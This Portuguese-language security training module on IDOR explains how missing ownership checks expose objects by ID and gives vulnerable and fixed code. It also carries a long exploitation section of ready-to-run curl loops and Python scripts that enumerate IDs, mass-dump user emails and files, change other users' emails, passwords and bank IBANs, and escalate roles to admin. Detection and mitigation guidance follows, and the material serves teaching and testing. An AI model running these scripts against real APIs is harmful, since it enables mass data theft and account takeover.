---
title: "IDOR"
---

# IDOR — Insecure Direct Object Reference

## A Falha: Referência Direta a Objetos Sem Verificação de Propriedade

IDOR (Insecure Direct Object Reference) ocorre quando a API expõe IDs internos de objetos e **não verifica se o usuário autenticado tem direito de acessar aquele objeto específico**. A distinção crítica: o sistema verifica **quem é o usuário** (autenticação), mas não verifica **o que esse usuário pode acessar** (autorização).

A suposição incorreta de design é: "se o usuário está autenticado, ele pode acessar qualquer recurso que saiba o ID". A realidade é que IDs de banco de dados são sequenciais e previsíveis — qualquer usuário logado pode iterar pelos IDs e acessar dados de outros.

**Perspectiva do desenvolvedor**: ao implementar uma API REST, o desenvolvedor pensa: "o usuário precisa estar logado para chamar esse endpoint" — e implementa a verificação de autenticação. O que frequentemente é esquecido é a segunda verificação: "o usuário que está chamando é o dono desse objeto?". Autenticação e autorização são responsabilidades distintas e precisam ser implementadas separadamente para cada endpoint.

Considere este cenário concreto: o endpoint de localização de veículos `GET /api/vehicle/{id}/location` retorna dados do veículo de qualquer ID passado, sem verificar se o veículo pertence ao usuário autenticado. Na seção de posts da comunidade, a resposta inclui o ID do veículo de outros usuários. Combinando: o atacante coleta IDs de veículos alheios nos posts e acessa a localização deles diretamente pela API.

IDOR é o **API1** no OWASP API Top 10 — a vulnerabilidade mais comum em APIs REST. A frequência é alta porque separar autenticação de autorização é uma distinção sutil que não emerge naturalmente do desenvolvimento iterativo.

**Impacto real**: acesso horizontal (usuário A lê/modifica dados do usuário B), acesso vertical (usuário comum acessa dados de admin), dump em massa de dados de todos os usuários, violação de LGPD/GDPR.

---

## Causa Raiz

### API Expõe ID e Não Verifica Propriedade

```go
// Go — endpoint de localizacao de veiculo (vulneravel)
func GetVehicleLocation(w http.ResponseWriter, r *http.Request) {
    vehicleID := mux.Vars(r)["id"]
    
    // Apenas verifica se usuario esta autenticado (via middleware)
    // NAO verifica se o veiculo pertence ao usuario autenticado
    vehicle := db.FindVehicle(vehicleID)
    
    if vehicle == nil {
        http.Error(w, "Not found", 404)
        return
    }
    
    // Retorna localizacao do veiculo independente de quem chamou
    json.NewEncoder(w).Encode(vehicle)
}
```

```go
// SEGURO: verificar propriedade apos autenticacao
func GetVehicleLocation(w http.ResponseWriter, r *http.Request) {
    vehicleID := mux.Vars(r)["id"]
    currentUserID := r.Context().Value("user_id").(string)
    
    vehicle := db.FindVehicle(vehicleID)
    
    if vehicle == nil {
        http.Error(w, "Not found", 404)
        return
    }
    
    // VERIFICACAO DE AUTORIZACAO: o veiculo pertence ao usuario atual?
    if vehicle.OwnerID != currentUserID {
        http.Error(w, "Forbidden", 403)
        return
    }
    
    json.NewEncoder(w).Encode(vehicle)
}
```

### O Que Está Faltando

O padrão correto para qualquer endpoint que acessa um objeto por ID:

```python
# Checklist de verificacao para endpoints com ID
def get_object_endpoint(request, object_id):
    # 1. Autenticacao: usuario esta logado?
    current_user = get_authenticated_user(request)
    if not current_user:
        return 401
    
    # 2. Objeto existe?
    obj = db.find(object_id)
    if not obj:
        return 404
    
    # 3. AUTORIZACAO: usuario tem direito a este objeto?
    if obj.owner_id != current_user.id and not current_user.is_admin:
        return 403  # nao revelar que o objeto existe (evitar enumeracao)
    
    return obj
```

### Exposição de Dados Excessiva Como Vetor de IDOR

A vulnerabilidade de IDOR pode ser facilitada por exposição de dados excessiva: o endpoint `GET /api/community/posts` retorna, para cada post, o `email` e o `vehicle_id` do autor. Esses dados não são necessários para exibir o post, mas estão no objeto retornado porque o desenvolvedor não filtrou a resposta.

```go
// VULNERAVEL: struct expoe todos os campos
type Post struct {
    ID        string `json:"id"`
    Content   string `json:"content"`
    AuthorID  string `json:"author_id"`
    AuthorEmail string `json:"email"`    // dado pessoal desnecessario!
    VehicleID string `json:"vehicle_id"` // ID que pode ser usado para IDOR!
}

// SEGURO: struct de resposta com apenas campos necessarios
type PostResponse struct {
    ID       string `json:"id"`
    Content  string `json:"content"`
    AuthorName string `json:"author_name"` // nome, nao email
    // VehicleID removido - nao necessario para exibir o post
}
```

---

## Como o Ataque Funciona

### Referência Direta Insegura

```
# URL com ID direto
GET /api/user/1234/profile
GET /documents/invoice_5678.pdf
GET /admin/orders/9999

# Parametro com ID
GET /view?id=1234
POST /update_email?userId=5678

# Cookie ou header com ID
X-User-ID: 1234
```

Quando o servidor recebe `userId=1234`, deveria verificar: "o usuário da sessão atual é de fato o usuário 1234?". Se não verifica → IDOR.

### Tipos de IDOR

| Tipo | Descrição | Exemplo |
|------|-----------|---------|
| Horizontal | Acesso a dados de outro usuário mesmo nível | Usuário 1 acessa dados do Usuário 2 |
| Vertical | Acesso a dados de nível superior | Usuário acessa endpoint de admin |
| Funcional | Executar ação de outro usuário | Deletar conta de outro usuário |
| Baseado em arquivo | Acessar arquivo de outro usuário | `/downloads/user_1234/secret.pdf` |
| Baseado em referência indireta | GUID ou hash previsível | UUID v1 baseado em timestamp |

---

## Discovery / Identificação

### Identificar Pontos de Referência a Objetos

```bash
# Buscar parametros numericos em URLs e bodies
# GET /api/profile?id=123
# GET /files/document.pdf  (nomes previsiveis)
# POST /api/update {"userId": 123, "email": "..."}

# Usar Burp → Target → Site Map
# Filtrar por parametros: id, user_id, account, order, invoice, file, doc
```

**Coletar IDs de outros usuários**: observar respostas de endpoints que listam outros usuários ou recursos (como endpoints de posts da comunidade). Qualquer ID exposto na resposta pode ser usado em outro endpoint que não verifica propriedade.

### Mapear Endpoints que Usam IDs

```bash
# ffuf para descobrir endpoints com IDs
ffuf -w /opt/useful/seclists/Discovery/Web-Content/api/api-endpoints.txt:FUZZ \
     -u "http://alvo.com/api/FUZZ" \
     -mc 200,201,401,403

# Testar IDs diferentes
for id in $(seq 1 100); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
             "http://alvo.com/api/user/$id" \
             -H "Cookie: session=MINHA_SESSAO")
    echo "ID $id: HTTP $STATUS"
done
```

### Análise de Respostas

```bash
# Comparar resposta do proprio ID vs ID de outro usuario
# Proprio ID
curl -s "http://alvo.com/api/user/1234" \
     -H "Cookie: session=MINHA_SESSAO" | jq

# ID de outro usuario
curl -s "http://alvo.com/api/user/1235" \
     -H "Cookie: session=MINHA_SESSAO" | jq

# Se ambos retornam dados → IDOR confirmado
```

---

## Exploitation

### 1. IDOR Básico em URL

```bash
# Situacao: logado como usuario com ID 1234
# Testar IDs adjacentes

# Leitura de dados de outro usuario
curl -s "http://alvo.com/api/user/1235/profile" \
     -H "Cookie: session=MINHA_SESSAO"

# Leitura de documentos de outro usuario
curl -s "http://alvo.com/documents/user_1235_invoice.pdf" \
     -H "Cookie: session=MINHA_SESSAO" \
     -o invoice_1235.pdf

# Leitura de mensagens privadas
curl -s "http://alvo.com/api/messages/inbox?userId=1235" \
     -H "Cookie: session=MINHA_SESSAO"
```

### 2. IDOR em Parâmetro POST/PUT

```bash
# Modificar dados de outro usuario
curl -s -X PUT "http://alvo.com/api/user/update" \
     -H "Cookie: session=MINHA_SESSAO" \
     -H "Content-Type: application/json" \
     -d '{"userId": 1235, "email": "attacker@evil.com"}'

# Mudar senha de outro usuario
curl -s -X POST "http://alvo.com/api/change_password" \
     -H "Cookie: session=MINHA_SESSAO" \
     -d '{"userId": 1235, "new_password": "hacked123"}'

# Trocar conta bancaria de outro usuario
curl -s -X POST "http://alvo.com/api/bank/update" \
     -H "Cookie: session=MINHA_SESSAO" \
     -H "Content-Type: application/json" \
     -d '{"accountId": 9999, "iban": "IBAN_ATACANTE"}'
```

### 3. IDOR em API REST — Fuzzing Automatizado

```bash
# Burp Intruder: marcar ID na URL, usar lista numerica
# Ou via curl loop

# Dump em massa de usuarios
for id in $(seq 1000 2000); do
    RESP=$(curl -s "http://alvo.com/api/users/$id" \
                -H "Cookie: session=MINHA_SESSAO")
    if echo "$RESP" | grep -q '"email"'; then
        echo "User $id: $(echo $RESP | jq -r '.email')"
    fi
done

# Dump com ffuf
seq 1 1000 > ids.txt
ffuf -w ids.txt:ID \
     -u "http://alvo.com/api/user/ID/data" \
     -H "Cookie: session=MINHA_SESSAO" \
     -mc 200 \
     -o idor_results.json
```

### 4. IDOR com IDs Codificados

Muitas aplicações usam hashes ou codificação para "ofuscar" IDs:

```bash
# Base64
echo "1234" | base64         # MTIzNA==
echo "1235" | base64         # MTIzNQ==
curl -s "http://alvo.com/api/user/MTIzNQ==" \
     -H "Cookie: session=MINHA_SESSAO"

# MD5 de ID
python3 -c "import hashlib; print(hashlib.md5(b'1235').hexdigest())"
# 6a4db6d2cf7870e7cfa75b44e79c2e33

# URL encoded
python3 -c "import urllib.parse; print(urllib.parse.quote('1235'))"
```

**Script para fuzz de IDs codificados em base64**:
```python
import requests
import base64

session = "MINHA_SESSAO"
headers = {"Cookie": f"session={session}"}

for user_id in range(1000, 2000):
    encoded = base64.b64encode(str(user_id).encode()).decode()
    r = requests.get(
        f"http://alvo.com/api/user/{encoded}",
        headers=headers
    )
    if r.status_code == 200 and "email" in r.text:
        print(f"[+] ID {user_id} (b64: {encoded}): {r.json().get('email')}")
```

### 5. IDOR em GUIDs/UUIDs

UUIDs v1 são baseados em timestamp e MAC address — podem ser previsíveis:

```bash
# Obter GUID do proprio perfil
# Analisar a estrutura temporal
python3 -c "
import uuid
u = uuid.UUID('6ba7b810-9dad-11d1-80b4-00c04fd430c8')
print('Version:', u.version)
print('Time:', u.time)
"

# Ferramentas para analise de UUID v1
pip install uuid-utils
```

### 6. IDOR Baseado em Arquivo

```bash
# Enumerar arquivos por nome previsivel
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u "http://alvo.com/downloads/FUZZ" \
     -mc 200

# Padroes comuns de nomes de arquivo
# invoice_1234.pdf → invoice_1235.pdf
# export_2024-03-15.csv → export_2024-03-16.csv
# user_1234_backup.zip → user_1235_backup.zip

# Script para enumerar arquivos
for i in $(seq 1000 1100); do
    URL="http://alvo.com/exports/user_${i}_data.json"
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL" \
             -H "Cookie: session=MINHA_SESSAO")
    if [ "$STATUS" = "200" ]; then
        echo "[+] Arquivo encontrado: $URL"
        curl -s "$URL" -H "Cookie: session=MINHA_SESSAO" \
             -o "dump_user_${i}.json"
    fi
done
```

### 7. IDOR via Referência Indireta com Mapa

Algumas aplicações usam referência indireta no frontend (index 1,2,3) mas expõem IDs reais na API:

```bash
# Interceptar request ao /api/documents
# Resposta pode conter IDs reais dos documentos
curl -s "http://alvo.com/api/documents" \
     -H "Cookie: session=MINHA_SESSAO" | jq '.[].id'

# Usar esses IDs para acessar documentos de outros usuarios
curl -s "http://alvo.com/api/document/REAL_ID_OUTRO_USER" \
     -H "Cookie: session=MINHA_SESSAO"
```

---

## Escalada de Privilégios via IDOR

### IDOR Vertical — Acessar Endpoints de Admin

```bash
# Testar IDs de admin (geralmente IDs baixos: 1, 2, admin)
curl -s "http://alvo.com/api/user/1/profile" \
     -H "Cookie: session=MINHA_SESSAO"

# Testar acoes de admin via parametro de role
curl -s -X POST "http://alvo.com/api/user/update" \
     -H "Cookie: session=MINHA_SESSAO" \
     -d '{"userId": 1234, "role": "admin"}'

# Tentar modificar o proprio role
curl -s -X PUT "http://alvo.com/api/profile" \
     -H "Cookie: session=MINHA_SESSAO" \
     -H "Content-Type: application/json" \
     -d '{"role": "admin", "email": "meu@email.com"}'
```

---

## Automação

### Burp Suite — Intruder para IDOR

1. Interceptar request com ID
2. Enviar para Intruder
3. Marcar o ID como posição de payload
4. Payload: Numbers — From 1 To 10000, Step 1
5. Grep para identificar respostas interessantes
6. Analisar diferença de Content-Length

### Script Python Completo para IDOR em API

```python
import requests
import json

BASE_URL = "http://alvo.com"
MY_SESSION = "MINHA_SESSAO"
MY_USER_ID = 1234

headers = {"Cookie": f"session={MY_SESSION}"}
found_data = []

print(f"[*] Iniciando IDOR scan. Usuario proprio: {MY_USER_ID}")

for target_id in range(1, 2001):
    if target_id == MY_USER_ID:
        continue  # Pular proprio ID
    
    r = requests.get(
        f"{BASE_URL}/api/user/{target_id}",
        headers=headers,
        timeout=5
    )
    
    if r.status_code == 200:
        try:
            data = r.json()
            found_data.append({
                "id": target_id,
                "email": data.get("email", "N/A"),
                "name": data.get("name", "N/A"),
                "role": data.get("role", "N/A")
            })
            print(f"[+] IDOR! ID {target_id}: {data.get('email', 'N/A')}")
        except:
            print(f"[+] IDOR! ID {target_id}: resposta 200 (nao JSON)")
    
    elif r.status_code == 403:
        print(f"[-] ID {target_id}: 403 Forbidden (protegido)")

# Salvar resultados
with open("idor_dump.json", "w") as f:
    json.dump(found_data, f, indent=2)

print(f"\n[*] Total: {len(found_data)} registros expostos")
```

---

## Detecção e Mitigação

### Do Lado do Defensor

```bash
# Buscar acessos incomuns — usuario acessando muitos IDs diferentes
awk '{print $1, $7}' /var/log/apache2/access.log \
  | grep "api/user" | sort | uniq -c | sort -rn

# Detectar scan sequencial de IDs
grep "api/user" /var/log/apache2/access.log \
  | awk '{print $7}' | grep -oP '\d+' | sort -n | uniq
```

### Implementação Correta

```python
# Verificacao de autorizacao obrigatoria em TODA requisicao com ID
def get_user_profile(request, user_id):
    # NUNCA confiar apenas no ID da URL
    current_user = request.session.get('user_id')
    
    # Verificar se usuario tem permissao
    if current_user != user_id and not is_admin(current_user):
        return HttpResponse(status=403)
    
    # So entao buscar o dado
    return User.objects.get(id=user_id)

# Usar UUIDs v4 (aleatorios) em vez de IDs sequenciais
import uuid
user_id = str(uuid.uuid4())  # totalmente aleatorio, impede enumeration

# Mapas de referencia indireta
# Em vez de expor ID real, usar chave de sessao → ID real no servidor
user_refs = {
    "ref_abc123": 1234,  # so o servidor sabe o ID real
    "ref_def456": 1235
}
```

**Filtrar dados retornados**: endpoints que retornam mais dados do que o necessário criam vetores para IDOR em outros endpoints. A regra é retornar apenas os campos necessários para o caso de uso da resposta — nunca retornar o objeto inteiro do banco de dados sem filtrar.

```python
# VULNERAVEL: retornar objeto completo do banco
def get_posts(request):
    posts = Post.find_all()
    return jsonify([post.to_dict() for post in posts])
    # to_dict() inclui email, vehicle_id, account_number...

# SEGURO: projeção explícita dos campos necessarios
def get_posts(request):
    posts = Post.find_all()
    return jsonify([{
        "id": post.id,
        "content": post.content,
        "author_name": post.author.display_name,
        "created_at": post.created_at
    } for post in posts])
```

---

## Cheatsheet Rápido

| Cenário | Técnica |
|---------|---------|
| ID numérico em URL | Incrementar/decrementar, testar 1-2000 |
| ID base64 | Decodificar, modificar, recodificar |
| ID MD5/hash | Hashear IDs conhecidos e testar |
| GUID previsível | Analisar UUID v1 (timestamp-based) |
| Arquivo com nome previsível | Enumerar com padrões |
| IDOR vertical | Tentar `role: admin` ou acessar endpoints `/admin/` |
| IDOR em POST | Adicionar/modificar `userId` no body |
| Mass dump | Loop curl ou script Python com sessão autenticada |
| IDs em outras respostas | Inspecionar resposta de endpoints de listagem para coletar IDs alheios |

---

## Módulos Relacionados

IDOR é uma subcategoria de Broken Access Control (`02_broken_access_control.md`): BAC é mais amplo e inclui acesso a funções privilegiadas além de acesso a objetos por ID. A exposição de dados excessiva (BOPLA) amplia a superfície de IDOR ao fazer com que endpoints retornem campos desnecessários — como `vehicle_id` em respostas de posts — que o atacante usa como entrada para outros endpoints vulneráveis. Combinando enumeração de usuários via Broken Auth (`../07_autenticacao/01_brute_force_e_broken_auth.md`) com IDOR, é possível realizar account takeover em massa: broken auth revela que um usuário existe, e IDOR fornece o vetor para modificar seus dados.
